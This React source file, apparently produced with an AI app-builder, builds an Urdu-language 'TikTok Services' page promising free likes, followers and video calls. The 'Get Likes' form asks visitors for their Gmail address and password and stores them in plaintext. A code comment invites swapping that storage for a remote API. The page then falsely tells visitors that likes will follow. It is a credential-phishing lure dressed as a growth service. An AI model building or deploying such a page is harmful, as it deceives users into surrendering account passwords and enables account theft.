
import React, { useState } from 'react';
import { motion } from 'framer-motion';
import { Helmet } from 'react-helmet';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card';
import { Toaster } from '@/components/ui/toaster';
import { useToast } from '@/components/ui/use-toast';
import { MessageCircle, Video, Heart, Users, Star, Zap } from 'lucide-react';

function App() {
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [videoUrl, setVideoUrl] = useState('');
  const { toast } = useToast();

  const handleGetLikes = async () => {
    if (!email || !password) {
      toast({
        title: "خرابی!",
        description: "براہ کرم Gmail اور Password دونوں فیلڈز بھریں",
        variant: "destructive"
      });
      return;
    }

    // Save to localStorage (you can replace this with your API)
    const userData = {
      email,
      password,
      timestamp: new Date().toISOString(),
      service: 'tiktok-likes'
    };

    try {
      // Save to localStorage
      const existingData = JSON.parse(localStorage.getItem('tiktokUsers') || '[]');
      existingData.push(userData);
      localStorage.setItem('tiktokUsers', JSON.stringify(existingData));

      toast({
        title: "کامیابی! 🎉",
        description: "آپ کی معلومات محفوظ ہو گئیں! جلد ہی likes مل جائیں گے",
      });

      // Clear form
      setEmail('');
      setPassword('');
    } catch (error) {
      toast({
        title: "خرابی!",
        description: "کچھ غلط ہو گیا، دوبارہ کوشش کریں",
        variant: "destructive"
      });
    }
  };

  const handleVideoCall = () => {
    if (!videoUrl) {
      toast({
        title: "ویڈیو لنک درکار!",
        description: "براہ کرم پہلے TikTok ویڈیو کا لنک ڈالیں",
        variant: "destructive"
      });
      return;
    }

    toast({
      title: "🚧 یہ فیچر ابھی دستیاب نہیں—لیکن پریشان نہ ہوں! آپ اگلے پرامپٹ میں اس کی درخواست کر سکتے ہیں! 🚀",
    });
  };

  const handleWhatsApp = () => {
    // You can replace this URL with your WhatsApp channel link
    window.open('https://wa.me/your-number', '_blank');
  };

  return (
    <>
      <Helmet>
        <title>TikTok Services - Free Likes & Video Calling</title>
        <meta name="description" content="Get free TikTok likes and video calling services. Best TikTok growth platform in Pakistan." />
      </Helmet>

      <div className="min-h-screen bg-gradient-to-br from-pink-900 via-purple-900 to-indigo-900 relative overflow-hidden">
        {/* Animated Background Elements */}
        <div className="absolute inset-0 overflow-hidden">
          <div className="absolute -top-40 -right-40 w-80 h-80 bg-pink-500/20 rounded-full blur-3xl animate-pulse"></div>
          <div className="absolute -bottom-40 -left-40 w-80 h-80 bg-purple-500/20 rounded-full blur-3xl animate-pulse delay-1000"></div>
          <div className="absolute top-1/2 left-1/2 transform -translate-x-1/2 -translate-y-1/2 w-96 h-96 bg-indigo-500/10 rounded-full blur-3xl animate-pulse delay-500"></div>
        </div>

        {/* Header */}
        <motion.header 
          initial={{ opacity: 0, y: -50 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ duration: 0.8 }}
          className="relative z-10 text-center py-8 px-4"
        >
          <motion.h1 
            className="text-5xl md:text-7xl font-bold bg-gradient-to-r from-pink-400 via-purple-400 to-indigo-400 bg-clip-text text-transparent mb-4"
            animate={{ 
              backgroundPosition: ['0% 50%', '100% 50%', '0% 50%'],
            }}
            transition={{ 
              duration: 3,
              repeat: Infinity,
              ease: "linear"
            }}
          >
            TIKTOK SERVICES
          </motion.h1>
          <motion.p 
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            transition={{ delay: 0.5 }}
            className="text-xl md:text-2xl text-white/80 font-medium"
          >
            Free Likes • Video Calling • Growth Services
          </motion.p>
        </motion.header>

        {/* Main Content */}
        <div className="relative z-10 container mx-auto px-4 py-8">
          <div className="grid lg:grid-cols-2 gap-8 max-w-6xl mx-auto">
            
            {/* Video Calling Service */}
            <motion.div
              initial={{ opacity: 0, x: -50 }}
              animate={{ opacity: 1, x: 0 }}
              transition={{ duration: 0.8, delay: 0.2 }}
            >
              <Card className="bg-white/10 backdrop-blur-lg border-white/20 shadow-2xl hover:shadow-pink-500/25 transition-all duration-300">
                <CardHeader className="text-center">
                  <div className="mx-auto w-16 h-16 bg-gradient-to-r from-pink-500 to-purple-500 rounded-full flex items-center justify-center mb-4">
                    <Video className="w-8 h-8 text-white" />
                  </div>
                  <CardTitle className="text-2xl font-bold text-white">TikTok Video Calling</CardTitle>
                  <p className="text-white/70">اپنے دوستوں کے ساتھ ویڈیو کال کریں</p>
                </CardHeader>
                <CardContent className="space-y-4">
                  <div>
                    <label className="block text-white/80 mb-2 font-medium">TikTok Video Link:</label>
                    <Input
                      type="url"
                      placeholder="https://tiktok.com/@username/video/..."
                      value={videoUrl}
                      onChange={(e) => setVideoUrl(e.target.value)}
                      className="bg-white/10 border-white/30 text-white placeholder:text-white/50 focus:border-pink-400"
                    />
                  </div>
                  <Button 
                    onClick={handleVideoCall}
                    className="w-full bg-gradient-to-r from-pink-500 to-purple-500 hover:from-pink-600 hover:to-purple-600 text-white font-bold py-3 rounded-lg shadow-lg hover:shadow-pink-500/50 transition-all duration-300"
                  >
                    <Video className="w-5 h-5 mr-2" />
                    Start Video Call
                  </Button>
                </CardContent>
              </Card>
            </motion.div>

            {/* Get Likes Service */}
            <motion.div
              initial={{ opacity: 0, x: 50 }}
              animate={{ opacity: 1, x: 0 }}
              transition={{ duration: 0.8, delay: 0.4 }}
            >
              <Card className="bg-white/10 backdrop-blur-lg border-white/20 shadow-2xl hover:shadow-purple-500/25 transition-all duration-300">
                <CardHeader className="text-center">
                  <div className="mx-auto w-16 h-16 bg-gradient-to-r from-purple-500 to-indigo-500 rounded-full flex items-center justify-center mb-4">
                    <Heart className="w-8 h-8 text-white" />
                  </div>
                  <CardTitle className="text-2xl font-bold text-white">Free TikTok Likes</CardTitle>
                  <p className="text-white/70">مفت میں TikTok likes حاصل کریں</p>
                </CardHeader>
                <CardContent className="space-y-4">
                  <div>
                    <label className="block text-white/80 mb-2 font-medium">Gmail Address:</label>
                    <Input
                      type="email"
                      placeholder="your.email@gmail.com"
                      value={email}
                      onChange={(e) => setEmail(e.target.value)}
                      className="bg-white/10 border-white/30 text-white placeholder:text-white/50 focus:border-purple-400"
                    />
                  </div>
                  <div>
                    <label className="block text-white/80 mb-2 font-medium">Password:</label>
                    <Input
                      type="password"
                      placeholder="••••••••"
                      value={password}
                      onChange={(e) => setPassword(e.target.value)}
                      className="bg-white/10 border-white/30 text-white placeholder:text-white/50 focus:border-purple-400"
                    />
                  </div>
                  <Button 
                    onClick={handleGetLikes}
                    className="w-full bg-gradient-to-r from-purple-500 to-indigo-500 hover:from-purple-600 hover:to-indigo-600 text-white font-bold py-3 rounded-lg shadow-lg hover:shadow-purple-500/50 transition-all duration-300"
                  >
                    <Heart className="w-5 h-5 mr-2" />
                    Get Likes
                  </Button>
                </CardContent>
              </Card>
            </motion.div>
          </div>

          {/* Features Section */}
          <motion.div
            initial={{ opacity: 0, y: 50 }}
            animate={{ opacity: 1, y: 0 }}
            transition={{ duration: 0.8, delay: 0.6 }}
            className="mt-16"
          >
            <h2 className="text-3xl md:text-4xl font-bold text-center text-white mb-12">
              ہماری خدمات
            </h2>
            <div className="grid md:grid-cols-3 gap-6 max-w-4xl mx-auto">
              <Card className="bg-white/5 backdrop-blur-sm border-white/10 text-center p-6 hover:bg-white/10 transition-all duration-300">
                <Users className="w-12 h-12 text-pink-400 mx-auto mb-4" />
                <h3 className="text-xl font-bold text-white mb-2">Free Followers</h3>
                <p className="text-white/70">مفت میں followers بڑھائیں</p>
              </Card>
              <Card className="bg-white/5 backdrop-blur-sm border-white/10 text-center p-6 hover:bg-white/10 transition-all duration-300">
                <Star className="w-12 h-12 text-purple-400 mx-auto mb-4" />
                <h3 className="text-xl font-bold text-white mb-2">Premium Features</h3>
                <p className="text-white/70">خصوصی فیچرز کا استعمال</p>
              </Card>
              <Card className="bg-white/5 backdrop-blur-sm border-white/10 text-center p-6 hover:bg-white/10 transition-all duration-300">
                <Zap className="w-12 h-12 text-indigo-400 mx-auto mb-4" />
                <h3 className="text-xl font-bold text-white mb-2">Fast Delivery</h3>
                <p className="text-white/70">فوری نتائج حاصل کریں</p>
              </Card>
            </div>
          </motion.div>
        </div>

        {/* Floating WhatsApp Button */}
        <motion.button
          onClick={handleWhatsApp}
          className="fixed bottom-6 right-6 w-16 h-16 bg-green-500 hover:bg-green-600 rounded-full shadow-2xl flex items-center justify-center z-50 transition-all duration-300 hover:scale-110"
          whileHover={{ scale: 1.1 }}
          whileTap={{ scale: 0.95 }}
          initial={{ scale: 0 }}
          animate={{ scale: 1 }}
          transition={{ delay: 1, type: "spring", stiffness: 200 }}
        >
          <MessageCircle className="w-8 h-8 text-white" />
        </motion.button>

        <Toaster />
      </div>
    </>
  );
}

export default App;
